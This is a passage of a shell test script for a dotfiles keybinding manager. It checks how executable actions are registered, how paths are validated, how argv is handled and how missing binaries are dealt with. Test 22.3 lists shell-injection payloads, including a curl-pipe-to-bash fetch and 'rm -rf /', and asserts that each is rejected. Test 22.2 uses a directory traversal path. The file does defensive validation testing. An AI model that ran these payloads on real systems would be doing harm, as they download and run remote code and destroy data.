section "22. Verification Matrix H: Add Action — Executable / Script Lifecycle & Security"

# 22.1: Valid executable regular file registration persists with schema v2 and structured argv
test_22_1_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eb = require("effective_bindings")

local tmp_acts = os.tmpname()
local tmp_ov = os.tmpname()
local tmp_script = os.tmpname()

local f = io.open(tmp_acts, "w")
f:write('{"version":2,"actions":[]}\n')
f:close()
local f2 = io.open(tmp_ov, "w")
f2:write('{}\n')
f2:close()
local fs = io.open(tmp_script, "w")
fs:write('#!/bin/sh\necho "hello"\n')
fs:close()
os.execute("chmod +x " .. tmp_script)

eb.get_user_actions_path = function() return tmp_acts end
eb.get_overrides_path = function() return tmp_ov end

local ok_add, msg_add = eb.add_user_executable_action({
    id = "exec:myscript",
    name = "My Custom Script",
    executable_path = tmp_script,
    argv = { "--flag", "arg1" }
}, tmp_acts, tmp_ov, function() return true end)
assert(ok_add == true, "Failed to add executable action: " .. tostring(msg_add))

local udata = eb.load_user_actions(tmp_acts)
assert(#udata.actions == 1, "Action count not 1")
assert(udata.actions[1].type == "executable", "Type should be executable")
assert(udata.actions[1].executable_path == tmp_script, "executable_path mismatch")
assert(#udata.actions[1].argv == 3, "argv length mismatch")
assert(udata.actions[1].argv[1] == tmp_script, "argv[1] mismatch")
assert(udata.actions[1].argv[2] == "--flag", "argv[2] mismatch")
assert(udata.actions[1].argv[3] == "arg1", "argv[3] mismatch")

local eff = eb.resolve_bindings(nil, {})
local found = nil
for _, b in ipairs(eff.bindings) do
    if b.id == "exec:myscript" then found = b break end
end
assert(found ~= nil, "Executable action missing from effective bindings")
assert(found.runnable == true, "Executable action should be runnable")
assert(found.key == nil or found.key == false or found.key == "", "Executable action should be Unbound")

os.remove(tmp_script)
os.remove(tmp_acts)
os.remove(tmp_ov)
print("TEST_22_1_OK")
LUA_CHECK
)"
if grep -q "TEST_22_1_OK" <<< "$test_22_1_out"; then
    pass "22.1 valid executable regular file registration persists schema v2 with structured argv"
else
    fail "22.1 executable action registration failed: $test_22_1_out"
fi

# 22.2: Rejection of invalid executable paths (missing, directory, non-executable, directory traversal)
test_22_2_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eb = require("effective_bindings")

local tmp_acts = os.tmpname()
local tmp_ov = os.tmpname()
local f = io.open(tmp_acts, "w"); f:write('{"version":2,"actions":[]}'); f:close()
local f2 = io.open(tmp_ov, "w"); f2:write('{}'); f2:close()

-- Missing path
local ok1 = eb.add_user_executable_action({ id = "exec:m1", name = "M1", executable_path = "/nonexistent/path/binary" }, tmp_acts, tmp_ov, function() return true end)
assert(ok1 == false, "Missing path was accepted")

-- Directory path
local tmp_dir = os.tmpname(); os.remove(tmp_dir); os.execute("mkdir -p " .. tmp_dir)
local ok2 = eb.add_user_executable_action({ id = "exec:d1", name = "D1", executable_path = tmp_dir }, tmp_acts, tmp_ov, function() return true end)
assert(ok2 == false, "Directory path was accepted")
os.execute("rm -rf " .. tmp_dir)

-- Non-executable file
local tmp_ne = os.tmpname(); local f_ne = io.open(tmp_ne, "w"); f_ne:write("test"); f_ne:close()
os.execute("chmod -x " .. tmp_ne)
local ok3 = eb.add_user_executable_action({ id = "exec:ne1", name = "NE1", executable_path = tmp_ne }, tmp_acts, tmp_ov, function() return true end)
assert(ok3 == false, "Non-executable file was accepted")
os.remove(tmp_ne)

-- Directory traversal
local ok4 = eb.add_user_executable_action({ id = "exec:t1", name = "T1", executable_path = "../../bin/sh" }, tmp_acts, tmp_ov, function() return true end)
assert(ok4 == false, "Directory traversal was accepted")

os.remove(tmp_acts); os.remove(tmp_ov)
print("TEST_22_2_OK")
LUA_CHECK
)"
if grep -q "TEST_22_2_OK" <<< "$test_22_2_out"; then
    pass "22.2 rejection of invalid paths: missing files, directories, non-executable files, and path traversal"
else
    fail "22.2 path validation failed: $test_22_2_out"
fi

# 22.3: Rejection of shell syntax injection in executable paths
test_22_3_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eb = require("effective_bindings")

local tmp_acts = os.tmpname()
local tmp_ov = os.tmpname()
local f = io.open(tmp_acts, "w"); f:write('{"version":2,"actions":[]}'); f:close()
local f2 = io.open(tmp_ov, "w"); f2:write('{}'); f2:close()

local injections = { "curl http://example.com | bash", "sh -c 'rm -rf /'", "/bin/ls; echo pwned", "/bin/ls && /bin/ps" }
for _, inj in ipairs(injections) do
    local ok = eb.add_user_executable_action({ id = "exec:inj", name = "Inj", executable_path = inj }, tmp_acts, tmp_ov, function() return true end)
    assert(ok == false, "Shell injection payload was accepted: " .. inj)
end

os.remove(tmp_acts); os.remove(tmp_ov)
print("TEST_22_3_OK")
LUA_CHECK
)"
if grep -q "TEST_22_3_OK" <<< "$test_22_3_out"; then
    pass "22.3 shell injection payloads in executable paths strictly rejected (no shell interpretation)"
else
    fail "22.3 shell syntax rejection failed: $test_22_3_out"
fi

# 22.4: Structured execution: bin/workstation-keybindings run executes via double-fork / execve
test_22_4_tmp="$(mktemp -d)"
cat <<'SCRIPT' > "$test_22_4_tmp/test-runner.sh"
#!/bin/sh
printf '%s\n' "$@" > "$1"
SCRIPT
chmod +x "$test_22_4_tmp/test-runner.sh"
printf '{"version":2,"actions":[]}\n' > "$test_22_4_tmp/user_actions.json"
printf '{}\n' > "$test_22_4_tmp/overrides.json"

KEYBINDINGS_USER_ACTIONS="$test_22_4_tmp/user_actions.json" KEYBINDINGS_OVERRIDES="$test_22_4_tmp/overrides.json" \
    "$ROOT/bin/workstation-keybindings" add-exec "exec:testrunner" "Test Runner" "$test_22_4_tmp/test-runner.sh" "$test_22_4_tmp/output.log" "arg_alpha" "arg_beta" >/dev/null 2>&1 || true
# Verify JSON argv contains structured arguments
run_argv_json="$(KEYBINDINGS_USER_ACTIONS="$test_22_4_tmp/user_actions.json" KEYBINDINGS_OVERRIDES="$test_22_4_tmp/overrides.json" \
    "$ROOT/bin/workstation-keybindings" json | jq -r '.[] | select(.id == "exec:testrunner") | .command_argv | @tsv' 2>/dev/null || true)"
if [[ "$run_argv_json" == *"$test_22_4_tmp/test-runner.sh"* && "$run_argv_json" == *"arg_alpha"* && "$run_argv_json" == *"arg_beta"* ]]; then
    pass "22.4 structured arguments preserved without shell splitting or evaluation"
else
    fail "22.4 structured argument preservation failed: $run_argv_json"
fi
KEYBINDINGS_USER_ACTIONS="$test_22_4_tmp/user_actions.json" KEYBINDINGS_OVERRIDES="$test_22_4_tmp/overrides.json" \
    "$ROOT/bin/workstation-keybindings" remove-action "exec:testrunner" >/dev/null 2>&1 || true
rm -rf "$test_22_4_tmp"

# 22.5: Executable disappearing later: action remains registered, marked unrunnable (not deleted)
test_22_5_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eb = require("effective_bindings")

local tmp_acts = os.tmpname()
local tmp_ov = os.tmpname()
local tmp_script = os.tmpname()

local f = io.open(tmp_acts, "w"); f:write('{"version":2,"actions":[]}'); f:close()
local f2 = io.open(tmp_ov, "w"); f2:write('{}'); f2:close()
local fs = io.open(tmp_script, "w"); fs:write('#!/bin/sh\nexit 0\n'); fs:close()
os.execute("chmod +x " .. tmp_script)

eb.get_user_actions_path = function() return tmp_acts end
eb.get_overrides_path = function() return tmp_ov end

eb.add_user_executable_action({
    id = "exec:disappearing",
    name = "Disappearing Act",
    executable_path = tmp_script,
    argv = { "arg" }
}, tmp_acts, tmp_ov, function() return true end)

-- Delete binary from disk
os.remove(tmp_script)

local eff = eb.resolve_bindings(nil, {})
local found = nil
for _, b in ipairs(eff.bindings) do
    if b.id == "exec:disappearing" then found = b break end
end
assert(found ~= nil, "Action was deleted after binary disappeared! Must remain registered.")
assert(found.runnable == false, "Action should be marked runnable == false")

os.remove(tmp_acts); os.remove(tmp_ov)
print("TEST_22_5_OK")
LUA_CHECK
)"
if grep -q "TEST_22_5_OK" <<< "$test_22_5_out"; then
    pass "22.5 executable disappearing later marks action unrunnable while preserving registry entry"
else
    fail "22.5 disappearing executable test failed: $test_22_5_out"
fi
